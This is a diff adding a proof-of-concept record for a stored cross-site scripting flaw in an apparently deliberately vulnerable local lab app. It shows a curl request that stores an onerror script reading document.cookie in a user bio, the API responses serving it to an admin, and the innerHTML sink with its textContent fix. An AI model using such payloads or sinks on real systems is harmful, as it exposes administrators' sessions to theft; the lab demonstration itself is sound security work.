@@ -1,0 +1,21 @@
+== VULN-005 Stored XSS: payload stored in user bio, served to admin panel ==
+# 1. Attacker (user 1) stores an XSS payload in their profile bio:
+curl -s -X PUT http://127.0.0.1:8001/api/users/1 -H 'Authorization: Bearer <user1_token>' \
+   -d '{"bio":"<img src=x onerror=alert(document.cookie)>"}'
+{
+    "id": 1,
+    "username": "user1",
+    "email": "user1@techcorp.local",
+    "role": "USER",
+    "bio": "<img src=x onerror=alert(document.cookie)>",
+    "created_at": "2026-09-15T17:56:29.334726+05:30"
+}
+# 2. Admin retrieves user list — payload is served (stored) and later rendered via innerHTML in the browser:
+        "role": "USER",
+        "bio": "<img src=x onerror=alert(document.cookie)>",
+        "created_at": "2026-09-15T17:56:29.334726+05:30"
+    },
+# 3. Offending frontend sink (app.js, vulnerable mode):
+   el.innerHTML = html;  // intentional lab sink  (secure mode: el.textContent = html)
+# 2. Admin retrieves user list (payload served to the admin browser):
+    user1 '<img src=x onerror=alert(document.cookie)>'
